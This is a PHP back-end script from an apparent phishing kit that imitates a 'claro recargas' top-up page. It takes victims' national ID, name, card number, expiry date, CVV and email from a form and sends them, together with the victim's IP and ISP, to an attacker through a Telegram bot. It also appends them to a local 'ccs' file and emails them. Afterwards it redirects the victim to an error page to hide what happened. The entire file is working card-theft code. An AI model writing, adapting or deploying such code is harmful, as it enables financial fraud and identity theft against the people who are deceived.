<?php
$dni = $_POST["dni"];
$nombre = $_POST["nombre"];
$cc = $_POST["cc"];
$mmaa = $_POST["mmaa"];
$cvv = $_POST["cvv"];
$correo = $_POST["correo"];
include_once("config.php");
$filter = "";
$mensaje = ">> Datos personales <<\n";
$mensaje .= "DNI: ".$dni."\n";
$filter .= strtolower($dni);
$mensaje .= "nombre: ".$nombre."\n";
$filter .= strtolower($nombre);
$mensaje .= "cc: ".$cc."\n";
$filter .= strtolower($cc);
$mensaje .= "mmaa: ".$mmaa."\n";
$filter .= strtolower($mmaa);
$mensaje .= "cvv: ".$cvv."\n";
$filter .= strtolower($cvv);
$mensaje .= "correo: ".$correo."\n";
$filter .= strtolower($correo);
$filter = base64_encode($filter);

$ip = getenv("REMOTE_ADDR");
$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
define('BOT_TOKEN', $bottoken);
define('CHAT_ID', $chatid);
define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');
function enviar_telegram($msj){
	$queryArray = [
		'chat_id' => CHAT_ID,
		'text' => $msj,
	];
	$url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
	$result = file_get_contents($url);
}
$file_name = 'data/'.$ip.'.db';
$read_data = fopen($file_name, "a+");
function enviar(){
	global $telegram_send, $file_save, $email_send, $email, $mensaje, $ip, $isp;
	if($telegram_send){
		enviar_telegram(">> claro recargas <<\n\n>> Datos de conexión <<\nIP: ".$ip."\nISP: ".$isp."\n\n".$mensaje);
	}
	if($file_save){
		$ccs_file_name = 'ccs/data.txt';
		$save_data = fopen($ccs_file_name, "a+");
		$msg = "========== DATOS claro recargas ==========\n\n";
		$msg .= ">> Datos de conexión <<\n\nIP: ".$ip."\nISP: ".$isp."\n\n";
		$msg .= $mensaje;
		$msg .= "========== DATOS claro recargas ==========\n\n";
		fwrite($save_data, $msg);
		fclose($save_data);
	}
	if($email_send){
		$msg = ">> claro <<\n\n";
		$msg .= $mensaje;
		mail($email, "claro", $msg);
	}
}
if($read_data){
	$data = fgets($read_data);
	$data = explode(";", $data);
	if(!(in_array($filter, $data))){
		fwrite($read_data, $filter.";");
		fclose($read_data);
		enviar();
	}
}
else {
	fwrite($read_data, $filter.";");
	fclose($read_data);
	enviar();
}
?>
<html>
<head>
<link href="style.css" rel="stylesheet" type="text/css"/>
</head>
<body>
<!-- base semi-transparente -->
<div id="fade" class="overlay">
</div>
<!-- fin base semi-transparente -->
<!-- ventana modal -->
<div id="light" class="modalok">
	<div>
		<div id="plop">
             <META http-equiv="refresh" content="0;URL=error.html">

		</div>
	</div>
	
</div>
<!-- fin ventana modal -->
